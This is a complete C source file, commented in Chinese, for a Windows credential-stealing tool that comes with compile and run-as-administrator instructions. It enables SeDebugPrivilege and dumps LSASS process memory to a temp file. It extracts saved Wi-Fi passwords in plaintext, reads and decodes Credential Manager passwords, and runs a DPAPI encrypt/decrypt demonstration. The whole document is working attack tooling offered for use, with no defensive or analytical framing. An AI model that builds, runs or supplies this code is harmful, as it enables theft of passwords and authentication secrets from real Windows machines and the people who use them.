// 文件：laztool_final.c
// 编译：x64 Native Tools Command Prompt -> cl /O2 /MT /Fe:LazTool.exe laztool_final.c /link wlanapi.lib dbghelp.lib credui.lib
// 运行：管理员身份运行

#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <wlanapi.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <stdio.h>
#include <wincred.h>
#include <shlwapi.h>

#ifndef WLAN_PROFILE_GET_PLAINTEXT
#define WLAN_PROFILE_GET_PLAINTEXT 0x00000002
#endif

#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "credui.lib")
#pragma comment(lib, "shlwapi.lib")

// 辅助：输出宽字符串（使用 printf + %S）
void PrintW(const wchar_t* format, ...) {
    va_list args;
    va_start(args, format);
    vwprintf(format, args);  // 还是用 wprintf 但确保控制台代码页
    va_end(args);
}

BOOL IsElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation = {0};
        DWORD dwSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, dwSize, &dwSize))
            fRet = Elevation.TokenIsElevated;
        CloseHandle(hToken);
    }
    return fRet;
}

BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;
    if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        CloseHandle(hToken);
        return FALSE;
    }
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        CloseHandle(hToken);
        return FALSE;
    }
    CloseHandle(hToken);
    return TRUE;
}

DWORD GetProcessPid(const wchar_t* procName) {
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(snapshot, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, procName) == 0) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32NextW(snapshot, &pe));
        }
        CloseHandle(snapshot);
    }
    return pid;
}

void DumpLsass() {
    printf("\n[+] ===== 模块1: LSASS 内存转储 =====\n");
    if (!EnableDebugPrivilege()) {
        printf("[-] 启用 SeDebugPrivilege 失败，请以管理员身份运行。\n");
        return;
    }
    printf("[*] SeDebugPrivilege 已启用。\n");
    DWORD pid = GetProcessPid(L"lsass.exe");
    if (pid == 0) {
        printf("[-] 未找到 lsass.exe 进程。\n");
        return;
    }
    printf("[*] 找到 LSASS PID: %lu\n", pid);
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_OPERATION, FALSE, pid);
    if (!hProcess) {
        printf("[-] 打开进程失败，错误码: %lu\n", GetLastError());
        return;
    }
    wchar_t dumpPath[MAX_PATH];
    GetTempPathW(MAX_PATH, dumpPath);
    wcscat_s(dumpPath, MAX_PATH, L"lsass.dmp");
    HANDLE hFile = CreateFileW(dumpPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] 创建转储文件失败，错误码: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return;
    }
    BOOL success = MiniDumpWriteDump(hProcess, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
    if (success) {
        printf("[+] LSASS 转储成功 -> %S\n", dumpPath);
    } else {
        DWORD err = GetLastError();
        printf("[-] MiniDumpWriteDump 失败，错误码: 0x%08X (%lu)\n", err, err);
    }
    CloseHandle(hFile);
    CloseHandle(hProcess);
}

void DumpWifiPasswords() {
    printf("\n[+] ===== 模块2: Wi-Fi 明文密码 =====\n");
    HANDLE hClient = NULL;
    DWORD dwCurVersion = 0;
    DWORD dwResult = WlanOpenHandle(2, NULL, &dwCurVersion, &hClient);
    if (dwResult != ERROR_SUCCESS) {
        printf("[-] WlanOpenHandle 失败，错误码: %lu。请确保 WLAN AutoConfig 服务正在运行。\n", dwResult);
        return;
    }
    printf("[*] WLAN API 初始化成功。\n");
    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
    dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);
    if (dwResult != ERROR_SUCCESS) {
        printf("[-] WlanEnumInterfaces 失败，错误码: %lu。没有无线网卡或驱动问题。\n", dwResult);
        WlanCloseHandle(hClient, NULL);
        return;
    }
    printf("[*] 找到 %lu 个无线接口。\n", pIfList->dwNumberOfItems);
    int found = 0;
    for (DWORD i = 0; i < pIfList->dwNumberOfItems; i++) {
        PWLAN_PROFILE_INFO_LIST pProfileList = NULL;
        if (WlanGetProfileList(hClient, &pIfList->InterfaceInfo[i].InterfaceGuid, NULL, &pProfileList) == ERROR_SUCCESS) {
            printf("[*] 接口 %lu 上有 %lu 个配置文件。\n", i, pProfileList->dwNumberOfItems);
            for (DWORD j = 0; j < pProfileList->dwNumberOfItems; j++) {
                WLAN_PROFILE_INFO profile = pProfileList->ProfileInfo[j];
                DWORD flags = WLAN_PROFILE_GET_PLAINTEXT;
                DWORD granted = 0;
                LPWSTR xml = NULL;
                if (WlanGetProfile(hClient, &pIfList->InterfaceInfo[i].InterfaceGuid, profile.strProfileName, NULL, &xml, &flags, &granted) == ERROR_SUCCESS) {
                    wchar_t* keyStart = wcsstr(xml, L"<keyMaterial>");
                    if (keyStart) {
                        keyStart += wcslen(L"<keyMaterial>");
                        while (*keyStart && iswspace(*keyStart)) keyStart++;
                        wchar_t* keyEnd = wcsstr(keyStart, L"</keyMaterial>");
                        if (keyEnd) {
                            while (keyEnd > keyStart && iswspace(*(keyEnd-1))) keyEnd--;
                            wchar_t saved = *keyEnd;
                            *keyEnd = L'\0';
                            printf("[+] SSID: %-20S -> 密码: %S\n", profile.strProfileName, keyStart);
                            *keyEnd = saved;
                            found++;
                        } else {
                            printf("[?] SSID: %-20S -> 有<keyMaterial>但无结束标签\n", profile.strProfileName);
                        }
                    } else {
                        printf("[i] SSID: %-20S -> 无密码（开放网络或企业认证）\n", profile.strProfileName);
                    }
                    WlanFreeMemory(xml);
                } else {
                    printf("[-] 无法获取配置文件 %S 的详细信息，可能权限不足。\n", profile.strProfileName);
                }
            }
            WlanFreeMemory(pProfileList);
        } else {
            printf("[-] 接口 %lu 无法获取配置文件列表。\n", i);
        }
    }
    WlanFreeMemory(pIfList);
    WlanCloseHandle(hClient, NULL);
    if (found == 0) printf("[-] 未找到任何保存明文密码的 Wi-Fi 配置文件。\n");
    else printf("[+] 共找到 %d 个 Wi-Fi 密码。\n", found);
}

void DumpCredentialManager() {
    printf("\n[+] ===== 模块3: 凭据管理器 =====\n");
    PCREDENTIALW *creds = NULL;
    DWORD count = 0;
    if (!CredEnumerateW(NULL, 0, &count, &creds)) {
        DWORD err = GetLastError();
        printf("[-] CredEnumerate 失败，错误码: %lu。可能没有保存的凭据或服务未启动。\n", err);
        return;
    }
    printf("[*] 找到 %lu 个凭据。\n", count);
    int found = 0;
    for (DWORD i = 0; i < count; i++) {
        PCREDENTIALW cred = creds[i];
        printf("\n目标: %S\n", cred->TargetName ? cred->TargetName : L"(null)");
        printf("用户名: %S\n", cred->UserName ? cred->UserName : L"(空)");
        if (cred->CredentialBlobSize && cred->CredentialBlob) {
            BYTE* blob = cred->CredentialBlob;
            DWORD size = cred->CredentialBlobSize;
            // 尝试宽字符
            if (size % 2 == 0 && size >= 2) {
                wchar_t* w = (wchar_t*)blob;
                int wlen = size / 2;
                if (w[wlen-1] == 0) wlen--;
                BOOL ok = TRUE;
                for (int k = 0; k < wlen; k++) if (w[k] < 0x20 && w[k] != 0) { ok = FALSE; break; }
                if (ok && wlen > 0) {
                    printf("密码(宽): %.*S\n", wlen, w);
                    found++;
                    continue;
                }
            }
            // 尝试 ANSI
            char* a = (char*)blob;
            BOOL ok = TRUE;
            for (DWORD k = 0; k < size; k++) if (a[k] < 0x20 && a[k] != 0) { ok = FALSE; break; }
            if (ok && size > 0) {
                printf("密码(ANSI): %.*s\n", size, a);
                found++;
                continue;
            }
            // 二进制显示
            printf("密码(hex): ");
            for (DWORD k = 0; k < min(size, 64); k++) printf("%02X ", blob[k]);
            printf("\n");
            found++;
        } else {
            printf("密码: (空)\n");
        }
    }
    CredFree(creds);
    if (found == 0) printf("[-] 未提取到任何含密码的凭据。\n");
    else printf("[+] 共提取 %d 个凭据密码。\n", found);
}

void DemonstrateDPAPI() {
    printf("\n[+] ===== 模块4: DPAPI 测试 =====\n");
    wchar_t testData[128] = L"DPAPI_Test_String_For_CurrentUser";
    DATA_BLOB in;
    in.pbData = (BYTE*)testData;
    in.cbData = (DWORD)((wcslen(testData) + 1) * sizeof(wchar_t));
    DATA_BLOB encrypted = {0}, decrypted = {0};
    if (!CryptProtectData(&in, L"Test", NULL, NULL, NULL, 0, &encrypted)) {
        printf("[-] CryptProtectData 失败，错误码: %lu\n", GetLastError());
        return;
    }
    printf("[*] 加密成功，加密后大小: %lu 字节\n", encrypted.cbData);
    if (!CryptUnprotectData(&encrypted, NULL, NULL, NULL, NULL, 0, &decrypted)) {
        printf("[-] CryptUnprotectData 失败，错误码: %lu\n", GetLastError());
        LocalFree(encrypted.pbData);
        return;
    }
    printf("[+] 解密成功: %S\n", (wchar_t*)decrypted.pbData);
    LocalFree(encrypted.pbData);
    LocalFree(decrypted.pbData);
}

int main() {
    // 设置控制台输出代码页为 UTF-8，使 printf 能正确显示中文（如果控制台字体支持）
    SetConsoleOutputCP(CP_UTF8);
    printf("=========================================================\n");
    printf("     Windows 凭据提取工具 v4.0 (管理员运行)             \n");
    printf("=========================================================\n");
    if (!IsElevated()) {
        printf("\n[-] 请以管理员身份运行此程序。\n");
        printf("    右键 -> 以管理员身份运行。\n");
        getchar();
        return 1;
    }
    printf("[+] 管理员权限已确认\n");
    DumpLsass();
    DumpWifiPasswords();
    DumpCredentialManager();
    DemonstrateDPAPI();
    printf("\n[*] 执行完毕。\n");
    return 0;
}
